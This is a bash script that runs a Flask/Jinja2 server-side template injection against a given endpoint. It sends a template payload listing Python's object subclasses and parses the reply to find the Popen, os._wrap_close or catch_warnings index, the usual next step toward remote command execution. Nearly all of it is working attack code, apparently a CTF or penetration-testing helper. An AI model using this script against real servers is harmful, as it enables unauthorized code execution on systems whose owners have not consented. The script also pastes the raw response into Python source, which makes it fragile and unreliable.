#!/bin/bash
# Flask SSTI — Find Popen/os._wrap_close index in MRO subclass list
# Usage: find_popen_index.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

# Get the subclass list
output=$(curl -s -G \
  --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()}}" \
  "$ENDPOINT" --max-time 10)

# Use Python to parse the index
python3 -c "
import re, sys
text = '''$output'''
classes = re.findall(r\"<class '([^']+)'>\", text)
for i, c in enumerate(classes):
    if 'Popen' in c:
        print(f'POPEN_INDEX:{i}')
        sys.exit(0)
    if '_wrap_close' in c:
        print(f'WRAP_CLOSE_INDEX:{i}')
for i, c in enumerate(classes):
    if 'catch_warnings' in c:
        print(f'CATCH_WARNINGS_INDEX:{i}')
        break
if not classes:
    print('NO_SUBCLASSES_FOUND')
" 2>/dev/null || echo "PARSE_ERROR"
